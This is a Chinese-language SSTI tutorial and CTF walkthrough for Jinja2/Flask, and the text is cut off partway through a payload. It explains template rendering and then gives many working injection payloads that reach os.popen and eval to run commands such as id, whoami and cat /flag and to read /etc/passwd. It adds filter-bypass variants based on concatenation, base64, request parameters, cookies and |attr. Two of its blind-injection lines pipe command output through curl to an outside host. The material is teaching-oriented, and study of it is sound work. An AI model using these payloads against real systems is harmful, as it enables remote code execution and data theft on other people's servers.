引发SSTI的真正原因\nrender_template渲染函数的问题\n渲染函数在渲染的时候，往往对用户输入的变量不做渲染。\n也就是说例如：`&#123;&#123;&#125;&#125;`在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把`&#123;&#123;&#125;&#125;`包裹的内容当做变量解析替换。比如`&#123;&#123;1+1&#125;&#125;`会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。\n还比如说\n由前面模板代码安利的演示，我们可以发现，若服务端接受了用户的输入后（比如对于上述案例，data的name和age的数据由数据的输入/提交/请求而得），未经任何处理就将其作为Web应用模板内容的一部分，就会导致模板引擎在进行目标编译渲染的过程中，执行了用户插入的可执行语句，从而可能导致信息泄露、代码执行等问题\n\n凡是使用模板的地方，SSTI是绕不过的问题，模板引擎可由多种语言实现，所以SSTI也就出现在了多种语言环境中\n模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。\n6. route装饰器路由\n@app.route(&#x27;/&#x27;)\n使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如\n@app.route(&#x27;/&#x27;)def test()&quot;   return 123\n访问127.0.0.1:5000/则会输出123，我们修改一下规则\n这个时候访问127.0.0.1:5000/test会输出123.\n此外还可以设置动态网址，\n@app.route(&quot;/hello/&lt;username&gt;&quot;)def hello_user(username):  return &quot;user:%s&quot;%username\n根据url里的输入，动态辨别身份，此时便可以看到如下页面：\n\n或者可以使用int型，转换器有下面几种：\nint    接受整数float    同 int ，但是接受浮点数path    和默认的相似，但也接受斜线@app.route(&#x27;/post/&lt;int:post_id&gt;&#x27;)def show_post(post_id):    # show the post with the given id, the id is an integer    return &#x27;Post %d&#x27; % post_id\n7. main入口\n​\t\t当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。\nif __name__ == &#x27;__main__&#x27;:    app.debug = True    app.run()\n测试的时候，我们可以使用debug，方便调试，增加一句\napp.debug = True\n或者（效果是一样的）\napp.run(debug=True)\n这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。\napp.run(host=&#x27;0.0.0.0&#x27;)\n这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。\n8. 模板渲染（重点）\n你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:\n简单的模版渲染示例\nfrom flask import render_template@app.route(&#x27;/hello/&#x27;)@app.route(&#x27;/hello/&lt;name&gt;&#x27;)def hello(name=None):        return render_template(&#x27;hello.html&#x27;, name=name)//我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看\n我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。\n首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。\n├── app.py  ├── static  │   └── style.css  └── templates      └── index.html\n\n我们写一个index.html文件写templates文件夹中。\n&lt;html&gt;  &lt;head&gt;    &lt;title&gt;&#123;&#123;title&#125;&#125; - 小猪佩奇&lt;/title&gt;  &lt;/head&gt; &lt;body&gt;      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;  &lt;/body&gt;&lt;/html&gt;\n里面有两个参数需要我们渲染，user.name，以及title\n我们在app.py文件里进行渲染。\n@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)#我们访问/或者/index都会跳转def index():   user = &#123;&#x27;name&#x27;: &#x27;小猪佩奇&#x27;&#125;#传入一个字典数组   return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,user=user)\n\nImage这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。\n2.2. 判断SSTI类型\n上面提到网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型？\n广为流传的就是这张图了，根据处理返回值的不同来进行判别。（注意括号的数量等）\n\n1. 常见的模板引擎\n\tPHPTwig模板变量：&#123;&#123;%s&#125;&#125;Smarty模板变量：&#123;%s&#125;Blade模板变量：&#123;&#123;%s&#125;&#125;\tPythonJinja2模板变量：&#123;&#123;%s&#125;&#125;Tornado模板变量：&#123;&#123;%s&#125;&#125;Django模板变量：&#123;&#123; &#125;&#125;\tJavaFreeMarker模板变量：&lt;#%s&gt;``$&#123;%s&#125;Velocity模板变量：#set($x=1+1)$&#123;x&#125;\n模板引擎众多，各个模板引擎的语法也不尽相同，我们最主要的是能定位出是否存在SSTI漏洞，至于后续的利用，我们掌握一些，其余的见到再查即可\nJinja2\nJinja2 是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。\nJinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 &#123;&#123;…&#125;&#125; 块。\nJinja2 模板同样支持控制语句，像在 &#123;%…%&#125; 块中。\n控制结构 &#123;% %&#125; 可以声明变量，也可以执行语句变量取值 &#123;&#123; &#125;&#125; 用于将表达式打印到模板输出注释块 &#123;# #&#125; 用于注释\n2. 如何测试是否存在SSTI\n简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI\n此处我们拿来bmjoker师傅提供的一段示例代码\nTwig模板引擎示例代码\n&lt;?php　　require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;;　　Twig_Autoloader::register(true);    // Twig_Loader_Array 用于定位模板 内置的加载器    // Twig_Environment 来存储配置信息 内置的环境变量　　$twig = new Twig_Environment(new Twig_Loader_String());     // render() 方法通过其第一个参数载入模板，**并通过第二个参数中的变量来渲染模板**！！重要！！    // 模版含有 &#123;&#123;name&#125;&#125; 变量，其模版变量值来自于GET请求参数$_GET[&quot;name&quot;]　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));    // 将用户输入作为模版变量的值　　echo $output;?&gt;\n这段代码中，由于模板引擎一般都会默认对渲染的变量值进行编码和转义。所以一般情况下并不会存在XSS等攻击的可能\n若就如我们最开始的例子所说，若模板引擎渲染的内容受我们控制了，就不一定了\n// 上述代码基本内容不变，$output后的内容发生变化　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分\n此时render函数由于缺少第二个参数，所以直接就会把&quot;Hello 用户的输入&quot;拼如模板进行渲染,这就相当于改变了最初的模板，由于模板最初是由开发者定义的，所以他会受到“信任”\n对于Twig模板的变量`&#123;&#123;%s&#125;&#125;`除了传递变量外，还可以执行表达式，最简单的表达式就是&#123;&#123;2*2&#125;&#125;，这也是辨认是否存在SSTI最基本的指纹，若我们输入&#123;&#123;2*2&#125;&#125;，HTML页面返回其其结果4，就说明该表达式被解析，存在SSTI\n3. 靶场实战\nHTB-Templated\n\n题目直接提示我们本体使用的模板引擎为**Jinja2**，根据我们之前总结的各个模板引擎的变量类型，我们可以知道该变量的类型是 **&#123;&#123;%s&#125;&#125;**，所以话不多说我们直接拼接尝试\npayload=&#123;&#123;2 * 2&#125;&#125;\n\n2*2被计算，确认存在SSTI模板注入\nexp\n本题的重点还是在利用方面：由于我们的目标是读取处于服务器本地的一个存有Flag的文件，所以我们的重点是找到一个含有某种读取文件的函数的类（Python中），我们通过查阅手册发现可以利用Popen函数完成该功能，调用该函数会返回一个文件的句柄，然后再配合read()函数读取即可\n该函数会执行fork一个子进程执行command这个命令，同时将子进程的标准输出通过管道连接到父进程，对于文件在父进程调用read()读取即可，对于命令在父进程会被执行\n那么下面的重点就是，如何找到Popen这个函数所属的类，一般有两种方法，我们先说第一种\n由于我们想要找的是一个子类，所以第一步即使找到其对象基类 即class 'object'，为了达到这步，我们可以使用__mro__属性来访问对象的继承类，但我们目前没有对象，所以这里我们就构造一个空字符串:\n`&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;`其中`__class__`用于返回调用的参数类型\n\n可以看出该子类继承自class'str'与class 'object'并以一个元组返回，我们通过索引获得对象类\n&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;\n\n接下来，我们要列举出所有集成自object的子类，通过对该对象调用__subclasses__方法\n&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;\n\n但这有一个明显的缺点就是，好家伙，这么多子类，怎么可能找得到，为了缩小范围我们对其进行切片\n`&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[400:]&#125;&#125;`查找400个以后的元素\n\n成功定位其位置，处于滴414号位置\n&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[414]&#125;&#125;\n然后我们为该函数传递参数调用即可\n&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[414](&quot;ls&quot;,shell=True,stdout=-1).communicate()&#125;&#125;\n查看本地文件，发现flag.txt\n\nPopen.communicate()与进程交互：将数据发送到标准输入。从 stdout 和 stderr 读取数据，直到到达文件结尾\n之后我们直接cat他就看见啦~~~~\n&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[414](&quot;cat flag.txt&quot;,shell=True,stdout=-1).communicate()&#125;&#125;\n\n剩下的未实操过\nexp2\n这里我们还有一种方法，使用全局下的内置模块引用__builtins__（指向__builtin__）\n在Python中，有一个内建模块，该模块中有一些常用函数;而该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存\n&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[1500].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()&#125;&#125;\n同样，我们获取基本类后，继续向下获取基本类(object)的子类，然后init初始化类，globals全局来查找所有的方法及变量和参数并查看其内建模块的引用\n\n使用内建模块中的__import__引入os库，并适用其中的popen函数读取flag.txt即可\n\n注意：\n该exp中，对子类的选择subclasses()[1500]时，经测试大多数子类中都包含内建模块的引用，但依旧有不少不包含，要注意\n我们使用burp将子类的选择加为参数进行爆破\n\n遍历出（以下截图中Payload的子类号都可以引用，具有**__builtins__**）\n\n以下为不可以使用的（由此可看出号往大了写就对了~）\n\n4. SSTI利用思路\n先上Payload：\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[1].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;\n下面分步对每一步代码进行分析：\n1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。\n&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;# &lt;class &#x27;str&#x27;&gt;&#123;&#123;().__class__&#125;&#125;# &lt;type &#x27;tuple&#x27;&gt;&#123;&#123;[].__class__&#125;&#125;# &lt;type &#x27;list&#x27;&gt;&#123;&#123;&#123;&#125;.__class__&#125;&#125;# &lt;type &#x27;dict&#x27;&gt;\n2.下一步目的是拿到object基类。\n&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;# &lt;class &#x27;object&#x27;&gt;\n3.然后获取对应子类。\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;# [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, ...\n4.在所有的子类中选择一个可用的类，去获取__globals__全局变量。如果这些函数并没有被重载，这时他们并不是function，不具有__globals__属性。\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128]&#125;&#125;# &lt;class &#x27;os._wrap_close&#x27;&gt;\n5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量。\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__&#125;&#125;# &lt;function _wrap_close.__init__ at 0x00000221629F5048&gt;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__&#125;&#125;# ..., &#x27;eval&#x27;: &lt;built-in function eval&gt;, ...\n6.再获取到__globals__全局变量里的__builtins__中的eval函数。\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;# &#123;&#x27;__name__&#x27;: &#x27;builtins&#x27;, &#x27;__doc__&#x27;: ...&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;# &lt;built-in function eval&gt;\n7.使用popen命令执行即可。\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;)&#125;&#125;# root\n2.3 常用类\n先举几个基础的例子方便理解：\n1、class\n__class__用来查看变量所属的类，格式为变量.class\n&gt;&gt;&gt; ''.__class__\n&lt;class 'str'&gt;\n&gt;&gt;&gt; ().__class__\n&lt;class 'tuple'&gt;\n&gt;&gt;&gt; &#123;&#125;.__class__\n&lt;class 'dict'&gt;\n&gt;&gt;&gt; [].__class__\n&lt;class 'list'&gt;\n\n2、bases\n__bases__用来查看类的基类，注意是类的基类，所以格式为变量.class.bases\n&gt;&gt;&gt; ''.__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; ().__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; &#123;&#125;.__class__.__bases__\n(&lt;class 'object'&gt;,)\n&gt;&gt;&gt; [].__class__.__bases__\n(&lt;class 'object'&gt;,)\n\n同时也能加上数组，比如变量.class.bases[0]来获得第一个基类。\n值得一提的是还有个类是__mro__，它会显示类和基类，这是它和__bases__的不同。\n&gt;&gt;&gt; ''.__class__.__mro__\n(&lt;class 'str'&gt;, &lt;class 'object'&gt;)\n\n3、subclasses()\nsubclasses()查看当前类的子类，格式变量.class.bases[0].subclasses()\n这个类也可以加数组来查看指定的索引值，例如变量.class.bases[0].subclasses()[1]\n\n&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[0]&lt;class &#x27;type&#x27;&gt;\n这个时候就可以开始利用类里面的方法了。\n例如:\n变量.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__\ninit初始化类，然后globals全局来查找所有的方法及变量及参数。\n由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：\n&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()\n大概是这么个原理，但这样说来还是不知道怎么利用，来看几道题就能更深刻理解了。\n之后的题目参考：https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506\n魔术对象\n__class__  :返回类型所属的对象__mro__    :返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   &quot;返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__  获取当前类的所有子类__init__  类的初始化方法__globals__  对包含(保存)函数全局变量的字典的引用\n用魔术对象构造一个简单的语句\n我们在里面运行以下：\n&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]&lt;class &#x27;weakcallableproxy&#x27;&gt;&gt;&gt;&gt; \n解读一下：\nclass返回[]所属的对象；\nclass+base:返回这个对象所继承的基类\nclass+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类这就是一个具有[]的对象继承的基类的所有子类，在这里面我们不乏可以找到我们要用的子类如前文所提到的：file、open等等。\n那么既然我们要用SSTI去做些事情，那么我们就要用到这些子类呗。\n如何调用这些子类：\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]&lt;class &#x27;weakcallableproxy&#x27;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[3]&lt;class &#x27;weakproxy&#x27;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]&lt;class &#x27;wrapper_descriptor&#x27;&gt;\n这样我们就可以调用这些子类了\n假如我们要去查看某个网页获取flag，那么我们用file函数：(file 在PT2里面还可以使用，在PY3里面已经被移除了)\n[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()\n但是如果我们想要去获取目录等等，就需要用到system函数：读取目录一般是ls函数，那么我们来看看如何调用\n!/usr/bin/env python encoding: utf-8num = 0for item in &#x27;&#x27;.__class__.__mro__[2].__subclasses__():    try:         if &#x27;os&#x27; in item.__init__.__globals__:             print num,item         num+=1    except:        print &#x27;-&#x27;        num+=1\n得到类中OS模块的函数(71)\n().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)(os.listdir()：列出第一层目录文件 因为71是os库的函数，所以globals是对该函数字典的引用，所以我们这下就拿到了字典，然后紧接着就是我们要使用的命令。)\n有时候system函数会被过滤掉，我们就使用\n().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)  #读取本级目录\ndir()与__dict__\ndir()是一个函数，返回的是list；\n__dict__是一个字典，键为属性名，值为属性值；\ndir()返回所有的属性，而__dict__返回的是非父类的键与对应的值。\n2.4 常见的playload\n获得基类#python2.7&#x27;&#x27;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7&#x27;&#x27;.__。。。class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python 2.7#文件操作#找到file类[].__class__.__bases__[0].__subclasses__()[40]#读文件[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()#写文件[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)#命令执行#os执行[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()#eval,impoer等全局函数[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()#python3.7#命令执行&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#windows下的os命令&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()\n2.5 常见的命令执行方式\nos.system()\n…init__globals[‘os’].system(‘ls’)的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回0，失败返回-1，因为输出结果不明显，所以我们也会用到下面这个命令：\nos.popen()\n用法：os.popen(command[,mode[,bufsize]])eg:&#123;&#123;().class.base.subclass__()[71].init.globlas__[‘os’].popen(‘ls’,‘r’).read()&#125;&#125;说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。init.globals__[‘os’].popen(‘ls’,‘r’),read()popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。\n缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息\nwarnings.catchwarning\n访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。\n于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试）\n[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;ls&#x27;)\nvalues\n作用：返回字典中的所有值。\n使用：\n#!/usr/bin/pythondict = &#123;&#x27;Name&#x27;: &#x27;Zara&#x27;, &#x27;Age&#x27;: 7&#125;print &quot;Value : %s&quot; %  dict.values()以上实例输出结果为：Value : [7, &#x27;Zara&#x27;]\n__builtins__内建函数\n内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多我们需要的eval函数，可以执行命令,但是经常会被ban\n当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。`__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。__globals__：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。__import__()：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 __import__() 来动态载入，就是 import。语法：__import__(模块名)这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：\n&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)这两个payload用的是同一个模块,__builtins__模块,eval方法.[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].popen(&#x27;ls&#x27;).read()\n绕过\n拼接\nobject.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;)).read()\n编码\n().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)等价于().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(可以看出单双引号内的都可以编码)同理还可以进行rot13、16进制编码等\n过滤中括号[]\ngetitem()&quot;&quot;.__class__.__mro__[2]&quot;&quot;.__class__.__mro__.__getitem__(2)pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;)字典读取__builtins__[&#x27;eval&#x27;]()__builtins__.eval()经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行\n过滤双下划线__\n&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__将其中的 request.args 改为 request.values 则利用post的方式进行传参GET:&#123;&#123; &#x27;&#x27;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;POST:class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n过滤花括号\n&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;或者：\t&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curlhttp://http.bin.buuoj.cn/1inhq4f1 -d `ls / | grep flag`;&#x27;) %&#125;1&#123;% endif %&#125;如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/test&#x27;).read()[0:1]==&#x27;p&#x27;%&#125;1&#123;% endif %&#125;\n过滤引号\nrequest.args 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传值进来,进而绕过了引号的过滤\n&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passw\n过滤了单双引号和中括号\nrequest.cookies仍然可以用\n单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过拿点绕过，拿 getitem 等绕过都可\n以。\n使用request绕过的话可以这样：\n?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;Cookie:c=cat /flag\n过滤关键字\nbase64编码绕过\ngetattribute 使用实例访问属性时,调用该方法\n例如被过滤掉 class 关键词\n&#123;&#123;[].__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;\n字符串拼接绕过\n&#123;&#123;[].__getattribute__(&#x27;__c&#x27;+&#x27;lass__&#x27;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;\n过滤 _\n利用request.args属性&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__将其中的request.args改为request.values则利用post的方式进行传参\n过滤os\n?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag\n过滤args\n?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;cookie：a=os;b=popen;c=cat /flag&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;cookie:a=__globals__;b=cat /flag\n引号内十六进制绕过\n&#123;&#123;&quot;&quot;.__class__&#125;&#125;&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;_`是`\\x5f`，`.`是`\\x2E\n&quot; ’ chr等被过滤，无法引入字符串\n\n直接拼接键名\n\ndict(buil=aa,tins=dd)|join()\n\n利用 string 、 pop 、 list 、 slice 、 first 等过滤器从已有变量里面直接找\n\n(app.__doc__|list()).pop(102)|string()\n\n构造出 % 和 c 后，用格式化字符串代替 chr\n\n&#123;%set udl=dict(a=pc,c=c).values()|join %&#125;     # uld=%c&#123;%set i1=dict(a=i1,c=udl%(99)).values()|join %&#125;\n过滤数字\n例如web370\n就想办法构造出数字\n?name=&#123;% set c=(dict(e=a)|join|count)%&#125;&#123;% set 